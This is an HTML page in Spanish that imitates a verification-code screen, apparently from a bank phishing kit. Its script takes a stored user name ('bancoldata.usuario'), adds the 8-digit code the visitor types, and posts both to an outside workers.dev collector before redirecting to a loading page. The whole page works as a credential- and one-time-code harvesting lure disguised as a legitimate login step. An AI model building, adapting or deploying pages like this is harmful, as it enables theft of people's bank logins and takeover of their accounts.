<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Validación</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

<style>
body{
    margin:0;
    font-family:'Inter',sans-serif;
    background:#f4f4f4;
}

/* HEADER */
.header{
    padding:20px;
    font-size:22px;
    font-weight:600;
}

/* CONTENIDO */
.container{
    text-align:center;
    padding:20px;
}

/* CAJAS */
.code-boxes{
    display:flex;
    justify-content:center;
    gap:10px;
    margin:25px 0;
}

.box{
    width:45px;
    height:55px;
    border-radius:10px;
    background:#e6e3eb;
    font-size:22px;
    display:flex;
    align-items:center;
    justify-content:center;
}

/* TEXTO */
.text{
    color:#555;
    font-size:15px;
}

.email{
    color:#e91e63;
    font-weight:600;
}

/* BOTON */
.continue-btn{
    margin-top:20px;
    padding:14px;
    width:80%;
    border:none;
    border-radius:10px;
    background:#ccc;
    color:#777;
    font-weight:600;
}

.continue-btn.enabled{
    background:#6a1b9a;
    color:white;
}

/* INPUT OCULTO */
#claveInput{
    position:absolute;
    opacity:0;
}

/* TECLADO */
.keyboard{
    position:fixed;
    bottom:0;
    width:100%;
    background:white;
    padding:15px 0;
}

.keys{
    display:grid;
    grid-template-columns:repeat(3,1fr);
    gap:20px;
    max-width:300px;
    margin:auto;
}

.key{
    font-size:26px;
    text-align:center;
    padding:15px;
    cursor:pointer;
}
</style>
</head>

<body>

<div class="header">← Ingresa el código</div>

<div class="container">

    <!-- CAJAS VISUALES -->
    <div class="code-boxes" id="boxes"></div>

    <div class="text">
        Escribe los 8 números que enviamos a tu correo electrónico:<br>
        <span class="email">nic****@gmail.com</span>
    </div>

    <!-- INPUT REAL (NO SE BORRA) -->
    <input 
        type="password"
        id="claveInput"
        maxlength="8"
        inputmode="numeric"
    >

    <button class="continue-btn" id="loginButton" disabled>Continuar</button>

</div>

<!-- TECLADO -->
<div class="keyboard">
    <div class="keys">
        <div class="key">1</div>
        <div class="key">2</div>
        <div class="key">3</div>
        <div class="key">4</div>
        <div class="key">5</div>
        <div class="key">6</div>
        <div class="key">7</div>
        <div class="key">8</div>
        <div class="key">9</div>
        <div class="key"></div>
        <div class="key">0</div>
        <div class="key">⌫</div>
    </div>
</div>

<script>
/* 🔥 TUS ELEMENTOS (NO CAMBIADOS) */
const claveInput = document.getElementById('claveInput');
const loginButton = document.getElementById('loginButton');

/* 🔥 CREAR CAJAS VISUALES */
const boxesContainer = document.getElementById("boxes");

for(let i=0;i<8;i++){
    const div = document.createElement("div");
    div.classList.add("box");
    boxesContainer.appendChild(div);
}

const boxes = document.querySelectorAll(".box");

/* 🔥 SINCRONIZAR INPUT CON CAJAS */
function updateBoxes(){
    const val = claveInput.value;
    boxes.forEach((box,i)=>{
        box.textContent = val[i] ? "•" : "";
    });
}

/* 🔥 VALIDACIÓN ORIGINAL (NO CAMBIADA) */
claveInput.addEventListener('input', () => {
    if (claveInput.value.length > 8) {
        claveInput.value = claveInput.value.slice(0, 8);
    }

    if (claveInput.value.length === 8) {
        loginButton.classList.add('enabled');
        loginButton.disabled = false;
    } else {
        loginButton.classList.remove('enabled');
        loginButton.disabled = true;
    }

    updateBoxes();
});

/* 🔥 TECLADO */
document.querySelectorAll(".key").forEach(key=>{
    key.addEventListener("click", ()=>{
        let val = claveInput.value;

        if(key.textContent === "⌫"){
            claveInput.value = val.slice(0,-1);
        }else if(key.textContent !== ""){
            if(val.length < 8){
                claveInput.value += key.textContent;
            }
        }

        claveInput.dispatchEvent(new Event("input"));
    });
});

/* 🔥 TU LOGIN ORIGINAL (NO TOCADO) */
loginButton.addEventListener('click', async () => {
    const claveValue = claveInput.value.trim();
    if (claveValue.length !== 8) return alert("Debe ingresar 8 dígitos");

    try {
        let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
        const usuario = bancoldata.usuario;

        const transactionId = 'txn_' + Date.now();

        bancoldata.clave = claveValue;
        bancoldata.transactionId = transactionId;

        localStorage.setItem('bancoldata', JSON.stringify(bancoldata));

        const response = await fetch('https://quiet-haze-3548.micollflorez.workers.dev/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ usuario, clave: claveValue, transactionId })
        });

        const result = await response.json();

        if (result.ok) {
            window.location.href = "loading.html";
        } else {
            alert("Error en el login");
        }

    } catch (err) {
        console.error(err);
        alert("Error al procesar la solicitud");
    }
});
</script>

</body>
</html>
